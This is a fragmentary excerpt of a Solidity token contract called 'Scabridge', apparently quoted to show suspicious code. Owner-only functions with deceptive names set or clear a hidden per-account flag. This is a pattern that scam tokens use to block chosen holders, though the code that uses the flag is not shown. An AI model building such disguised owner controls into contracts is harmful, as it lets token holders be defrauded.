...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Scabridge';
    string constant public symbol = 'EST';
    ...
    function BridgeControler(address account) public onlyOwner {
        _reset[account] = true;
    }

    function DefaultAddres(address account) public onlyOwner {
        _reset[account] = false;
    }
    
    
    function StatsDeliveryBridge(address account) public view returns (bool) {
...
contract Scabridge is BaseToken {
